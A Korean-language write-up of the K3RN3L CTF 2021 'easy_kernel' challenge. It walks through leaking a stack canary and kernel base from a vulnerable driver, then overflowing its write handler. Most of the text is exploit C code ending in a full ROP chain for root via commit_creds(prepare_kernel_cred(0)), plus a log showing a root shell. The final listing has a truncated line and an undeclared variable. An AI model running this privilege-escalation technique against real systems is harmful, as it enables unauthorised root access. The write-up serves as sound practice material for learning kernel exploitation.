---
layout: simple
title: (K3RN3L CTF 2021) easy_kernel writeup
---

## **Intro**

커널 익스플로잇을 연습할겸 몇번은 CTF 문제를 풀어보기로 결정했다. 

어디까지나 메인 목표는 커널 공부를 하는 것이지만 권태기 해소용으로 좋은 것 같다. 

이번 문제는 2021년에 나온 K3RN3L CTF 중 easy kernel 문제이다. 

## **Vulnerability**

문제의 코드를 보면, `file_operaions` 구조체에 open, read, write, ioctl 함수를 등록해 놓은 것을 알 수 있다. 

```c
.rodata:00000000000003C0 fops            file_operations <offset __this_module, 0, offset sread, 0, 0, 0, 0, 0,\
.rodata:00000000000003C0                                         ; DATA XREF: init_func↑o
.rodata:00000000000003C0                                  0, 0, offset sioctl, 0, 0, 0, offset sopen, 0, \
.rodata:00000000000003C0                                  offset srelease, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
.rodata:00000000000003C0                                  0, 0, 0>
```

이 함수중에서 취약점이 있는 곳은 `sread`, `swrite` 함수이다. 

+ sread()

```c
void __fastcall sread(__int64 a1, __int64 user_buffer, __int64 length)
{
  char kernel_buffer[128]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 canary; // [rsp+80h] [rbp-10h]

  canary = __readgsqword(0x28u);
  strcpy(kernel_buffer, "Welcome to this kernel pwn series");
  if ( !(unsigned int)copy_user_generic_unrolled(user_buffer, kernel_buffer, length) )// buffer_leak
    sread_cold();
}
```

`sread()` 함수는 `copy_user_generic_unrolled()` 함수를 통해 커널 영역의 buffer 를 length 만큼 유저 영역이 buffer 로 복사해준다. 

이때 `length`는 사용자가 컨트롤 할 수 있는 값이기 때문에 나는 커널 영역의 스텍의 값을 가져올 수 있다. 

여기서 가져올 수 있는 값은 바로 kernel_base 주소와 canary 값이다. 이유는 모르겠는데, canary 값은 드라이버에서 사용자가 요청을 할 때마다 같게 나왔다. 

kernel_base 주소는 해당 모듈의 return address 가 kernel_base 와 고정적으로 위치가 같아 릭 할 수 있었다. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define DEVICE_NAME "/proc/pwn_device"
#define BUFFER_ADDR 0x11000
#define BUFFER_SIZE 0x6000

int control_read(uint64_t* buffer, unsigned int length)
{
    int fd = open(DEVICE_NAME, O_RDWR);
    if (fd < 0)
    {
        printf("read: open failed\n");
        return -1;
    }
    read(fd, (char*)buffer, length);
    return 0;
}

int main(void)
{
    
    save_state();
    uint64_t* buffer;
    buffer = mmap(BUFFER_ADDR, BUFFER_SIZE, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); //control size with mmap
    
    control_ioctl(GET_USERLAND_OFFSET, buffer); //check size
    printf("%s\n", (char*)buffer);
    memset(buffer, 0, BUFFER_SIZE);
    
    // ffffffff81000000 T _text
    // ffffffff81e010a1 T _etext
    // ffffffff81c00a2f T swapgs_restore_regs_and_return_to_usermode
    // 0xffffffff81c00b39
    // ffffffff81087e80 T commit_creds
    // ffffffff810881c0 T prepare_kernel_cred


    unsigned int read_length = 8 * 20;
    control_read(buffer, read_length);
    int i;
    for(i = 0; i < 20; i++)
    {
        printf("%llx\n", buffer[i]);
    }

    uint64_t canary = buffer[16];
    uint64_t kernel_base = buffer[18] - 0x23e347;
    memset(buffer, 0, BUFFER_SIZE);
    printf("canary: 0x%llx\n", canary);
    printf("kernel base: 0x%llx\n", kernel_base);
    return 0;
}
```

다음은 `swrite()` 함수의 코드다. 

+ swrite()

```c
void __fastcall swrite(__int64 file_struct, __int64 user_buffer, unsigned __int64 size)
{
  _QWORD kernel_buffer[18]; // [rsp+0h] [rbp-90h] BYREF

  kernel_buffer[16] = __readgsqword(0x28u);
  if ( MaxBuffer < size )
  {
    printk(&unk_2A8);
  }
  else if ( !(unsigned int)copy_user_generic_unrolled(kernel_buffer, user_buffer, size) )// overflow
  {
    swrite_cold();
  }
}
```

`swrite()` 는 반대로 유저 영역의 주소를 커널 영역의 주소로 복사한다. 이 때 size 역시 사용자가 컨트롤 할 수 있는데, 사이즈 검사를 한다. 

`MaxBufer` 보다 사이즈가 크면 안되는데, 문제는 `MaxBuffer` 의 크기를 `sioctl` 로 조절 할 수 있다. 

+ sioctl()

```c
__int64 __fastcall sioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  int v3; // ebp

  v3 = arg;
  printk(&unk_242);
  if ( cmd == 16 )
  {
    printk(&unk_252);
  }
  else if ( cmd == 32 )
  {
    MaxBuffer = v3;
  }
  else
  {
    printk(&unk_268);
  }
  return 0LL;
}
```

이때 32번 command 를 주면, 사용자 영역의 buffer 주소를 `MaxBuffer`로 설정하는 것을 볼 수 있는데, 우리는 사용자 영역의 buffer 주소를 `mmap` 을 통해서 조절 할 수가 있기 때문에 `Maxbuffer` 의 값을 조절 할 수 있고, `swrite()` 에서 버퍼 오버플로를 일으킬 수 있다!

그리고 `sread()`함수에서 canary를 릭 했기 떄문에 return address 를 덮어 rip 조절이 가능하다. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define SET_MAX_BUFFER 32
#define GET_USERLAND_OFFSET 16
#define DEVICE_NAME "/proc/pwn_device"
#define BUFFER_ADDR 0x11000
#define BUFFER_SIZE 0x6000


uint64_t user_cs;
uint64_t user_ss;
uint64_t user_sp;
uint64_t user_rflags;

int control_ioctl(uint64_t cmd, uint64_t* buffer)
{
    int fd = open(DEVICE_NAME, O_RDWR);
    int ioctl_result;
    if (fd < 0)
    {
        printf("ioctl: open failed\n");
        return -1;
    }

    ioctl_result = ioctl(fd, cmd, buffer);
    if (ioctl_result < 0)
    {
        printf("ioctl: ioctl failed\n");
    }
    return 0;
}

int control_read(uint64_t* buffer, unsigned int length)
{
    int fd = open(DEVICE_NAME, O_RDWR);
    if (fd < 0)
    {
        printf("read: open failed\n");
        return -1;
    }
    read(fd, (char*)buffer, length);
    return 0;
}

int control_write(uint64_t* buffer, unsigned int length)
{
    int fd = open(DEVICE_NAME, O_RDWR);
    if (fd < 0)
    {
        printf("write: open failed\n");
        return -1;
    }
    write(fd, (char*)buffer, length);
    return 0;
}

void close_device(void) {
    if(close(fd) == -1) {
        puts("[!] Error closing the device");
        exit(-1);
    }
    puts("[+] Device closed");
}

int main(void)
{
    
    save_state();
    uint64_t* buffer;
    buffer = mmap(BUFFER_ADDR, BUFFER_SIZE, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); //control size with mmap
    
    control_ioctl(GET_USERLAND_OFFSET, buffer); //check size
    printf("%s\n", (char*)buffer);
    memset(buffer, 0, BUFFER_SIZE);
    
    // ffffffff81000000 T _text
    // ffffffff81e010a1 T _etext
    // ffffffff81c00a2f T swapgs_restore_regs_and_return_to_usermode
    // 0xffffffff81c00b39
    // ffffffff81087e80 T commit_creds
    // ffffffff810881c0 T prepare_kernel_cred


    unsigned int read_length = 8 * 20;
    control_read(buffer, read_length);
    int i;
    for(i = 0; i < 20; i++)
    {
        printf("%llx\n", buffer[i]);
    }

    uint64_t canary = buffer[16];
    uint64_t kernel_base = buffer[18] - 0x23e347;
    memset(buffer, 0, BUFFER_SIZE);
    printf("canary: 0x%llx\n", canary);
    printf("kernel base: 0x%llx\n", kernel_base);

    control_ioctl(SET_MAX_BUFFER, buffer); //expand max length size
    memset(buffer, 0, BUFFER_SIZE);

    buffer[16] = canary;
    buffer[17] = 0x4141414142424242;
    buffer[18] = 0x4343434343434343;
    
    int write_length = 36 * 8;
    control_write(buffer, write_length); //ROP   
    return 0;
}
```

이렇게 rip 값을 `0x4343434343434343` 값으로 조절 할 수 있고, 그 후에 rop 를 사용할 수 있게 됐다. 

해당 커널에는 smep, smap, kpti, kaslr 이 걸려있는데, kaslr 은 커널 베이스를 릭했으니 문제될 게 없고, smep과 smap은 커널 영역에서 rop 를 진행할 것이기 때문에 이 역시도 문제될 건 없다. 

## **Exploitation**

 처음에는 `modprobe_path` 를 덮으려고 했으나, 이 커널에는 `modprobe_path`에 대한 심볼이 존재하지 않았다!

 그래서 전통적인 방법인 `commit_creds(prepare_kernel_cred(0))`을 통해 권한 상승을 하기로 하였다.

 다향이도 가젯은 rax 값을 rdi 로 옮길 수 있는 가젯을 찾을 수 있었다. 

```
0xffffffff8133afce: mov rdi, rax; test rbx, rbx; jg 0x53afc0; mov rax, rdi; pop rbx; ret; 
```

다음 가젯은 rax 를 rdi 로 옮기고, rbx 가 0보가 크면 점프를 하고, 아니면 rdi를 rax 값으로 바꾸고 rbx를 pop 한후 리턴하는 가젯이다. 

여기서 우리는 rbx 값을 조절할 수만 있다면 점프를 시키지 않고 위의 코드를 실행할 수 있고, rax의 값을 rdi 의 값으로 바꿀 수 있다!

rbx의 값을 조절 할 수 있는 가젯은 있었다. 

```
0xffffffff81000a76: pop rbx; ret; 
```

마지막으로 `kpti trampoline` 를 써서 유저영역으로 돌아오려고 했으나 그게 잘 안됐다.. 이유는 잘 모르겠지만 swapgs 와 iret 가젯을 직접 찾아 rop 를 수행하니까 정상적으로 잘 작동이 됐다. 

최종 익스플로잇 코드는 다음과 같다. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define SET_MAX_BUFFER 32
#define GET_USERLAND_OFFSET 16
#define DEVICE_NAME "/proc/pwn_device"
#define BUFFER_ADDR 0x11000
#define BUFFER_SIZE 0x6000


uint64_t user_cs;
uint64_t user_ss;
uint64_t user_sp;
uint64_t user_rflags;

void save_state()
{
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void get_flag()
{
    char *const argv[] = {"/tmp/trigger", NULL};
    char *const envp[] = {NULL};
    system("printf \"#!/bin/sh\\nchmod 777 /flag\" > /tmp/x");
    system("chmod +x /tmp/x");
    system("printf \"\\xff\\xff\\xff\\xff\" > /tmp/trigger");
    system("chmod +x /tmp/trigger");
    system("/tmp/trigger");
    system("cat flag.txt");
}

int control_ioctl(uint64_t cmd, uint64_t* buffer)
{
    int fd = open(DEVICE_NAME, O_RDWR);
    int ioctl_result;
    if (fd < 0)
    {
        printf("ioctl: open failed\n");
        return -1;
    }

    ioctl_result = ioctl(fd, cmd, buffer);
    if (ioctl_result < 0)
    {
        printf("ioctl: ioctl failed\n");
    }
    return 0;
}

int control_read(uint64_t* buffer, unsigned int length)
{
    int fd = open(DEVICE_NAME, O_RDWR);
    if (fd < 0)
    {
        printf("read: open failed\n");
        return -1;
    }
    read(fd, (char*)buffer, length);
    return 0;
}

int control_write(uint64_t* buffer, unsigned int length)
{
    int fd = open(DEVICE_NAME, O_RDWR);
    if (fd < 0)
    {
        printf("write: open failed\n");
        return -1;
    }
    write(fd, (char*)buffer, length);
    return 0;
}

void get_shell(void)
{
    system("/bin/sh");
    exit(-1);
}

void close_device(void) {
    if(close(fd) == -1) {
        puts("[!] Error closing the device");
        exit(-1);
    }
    puts("[+] Device closed");
}

int main(void)
{
    
    save_state();
    uint64_t* buffer;
    buffer = mmap(BUFFER_ADDR, BUFFER_SIZE, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); //control size with mmap
    
    control_ioctl(GET_USERLAND_OFFSET, buffer); //check size
    printf("%s\n", (char*)buffer);
    memset(buffer, 0, BUFFER_SIZE);
    
    // ffffffff81000000 T _text
    // ffffffff81e010a1 T _etext
    // ffffffff81c00a2f T swapgs_restore_regs_and_return_to_usermode
    // 0xffffffff81c00b39
    // ffffffff81087e80 T commit_creds
    // ffffffff810881c0 T prepare_kernel_cred


    unsigned int read_length = 8 * 20;
    control_read(buffer, read_length);
    int i;
    for(i = 0; i < 20; i++)
    {
        printf("%llx\n", buffer[i]);
    }

    uint64_t canary = buffer[16];
    uint64_t kernel_base = buffer[18] - 0x23e347;
    memset(buffer, 0, BUFFER_SIZE);
    printf("canary: 0x%llx\n", canary);
    printf("kernel base: 0x%llx\n", kernel_base);

    control_ioctl(SET_MAX_BUFFER, buffer); //expand max length size
    memset(buffer, 0, BUFFER_SIZE);

    buffer[16] = canary;
    buffer[17] = 0x4141414142424242;
    
    // 0xffffffff8133afce: mov rdi, rax; test rbx, rbx; jg 0x53afc0; mov rax, rdi; pop rbx; ret; 
    // 0xffffffff81000a76: pop rbx; ret; 
    // 0xffffffff81001518: pop rdi; ret;
    // 0xffffffff81c00eaa: swapgs; popfq; ret; 
    // 0xffffffff81023cc2: iretq; ret; 

    /* start ROP */
    uint64_t prepare_kernel_cred = kernel_base + 0x881c0;
    uint64_t commit_creds = kernel_base + 0x87e80;
    uint64_t kpti_trampoline = kernel_base + 0xc00a2f + 0x10a;
   
    uint64_t pop_rdi__ret = kernel_base + 0x1518;
    uint64_t pop_rbx__ret = kernel_base + 0xa76;
    uint64_t mov_rdi_rax_rbxjump_ret = kernel_base + 0x33afce;
    uint64_t swapgs_popfq_ret = kernel_base + 0xc00eaa;
    uint64_t iretq = kernel_base + 0x23cc2;

    printf("pop rdi address: 0x%llx\n", pop_rdi__ret);
    printf("%llx %llx %llx %llx", user_cs, user_rflags, user_sp, user_ss);
    buffer[18] = pop_rdi__ret;
    buffer[19] = 0;
    buffer[20] = prepare_kernel_cred;
    buffer[21] = pop_rbx__ret;
    buffer[22] = 0;
    buffer[23] = mov_rdi_rax_rbxjump_ret;
    buffer[24] = 0; // dummy
    buffer[25] = commit_creds;
    buffer[26] = swapgs_popfq_ret;
    buffer[27] = 0; // dummy
    buffer[28] = iretq;
    buffer[29] = (uint64_t)&get_shell + 8;
    buffer[30] = user_cs;
    buffer[31] = user_rflags;
    buffer[32] = user_sp;
    buffer[33] = u
    int write_length = 36 * 8;
    control_write(buffer, write_length); //ROP   
    return 0;
}
```

+ result

```bash
uid=1000(ctf) gid=1000 groups=1000
~ $ /exploit 
[   21.611605] Device opened
[   21.612734] IOCTL Called
[   21.613485] You passed in: 11000

[   21.623803] Device opened
[   21.625538] 160 bytes read from device
20656d6f636c6557
2073696874206f74
70206c656e72656b
6569726573206e77
ffff8d22c0830073
20000c31ad040
ffff8d22c0837c10
100020000
0
ffff8d2200000000
0
0
0
0
4fd3c534e7154500
a0
4fd3c534e7154500
a0
ffffffffb903e347
1
canary: 0x4fd3c534e7154500
kernel base: 0xffffffffb8e00000
[   21.687517] Device opened
[   21.688732] IOCTL Called
pop rdi address: 0xffffffffb8e01518
33 246 7ffe0e167800 2b
[   26.616725] Device opened
[   26.618879] 288 bytes written to device
/bin/sh: can't access tty; job control turned off
/home/ctf # id
uid=0(root) gid=0
/home/ctf # cat /flag.txt
flag{test_flag}
```

## **Conclusion**

`commit_creds(prepare_kernel_cred(0))`을 통해 익스를 할 수 있는 경험이어서 좋았다. 

좋은 연습이 되는 문제였던거 같다. 

## **References**

+ <https://github.com/sajjadium/ctf-archives/tree/main/ctfs/K3RN3L/2021/pwn/easy_kernel>
